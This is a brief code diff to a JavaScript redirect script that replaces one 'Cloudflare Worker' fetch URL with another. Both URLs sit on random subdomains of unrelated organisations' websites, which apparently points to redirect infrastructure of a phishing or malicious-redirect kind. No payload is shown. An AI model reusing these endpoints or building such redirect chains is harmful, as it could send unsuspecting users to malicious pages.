@@ -1,7 +1,5 @@
-// main.js: This script will handle the redirect logic
-
 // URL of the Cloudflare Worker (make sure to replace this with your actual Worker URL)
-const workerUrl = 'https://fjkgkfg.northayrshirebeekeepersassociation.org/jgjgkf';  // Replace with your Worker URL
+const workerUrl = 'https://headbois.whitefeathercomplementarypractice.org/enigns';  // Replace with your Worker URL
 
 // Fetch data from Cloudflare Worker
 fetch(workerUrl)
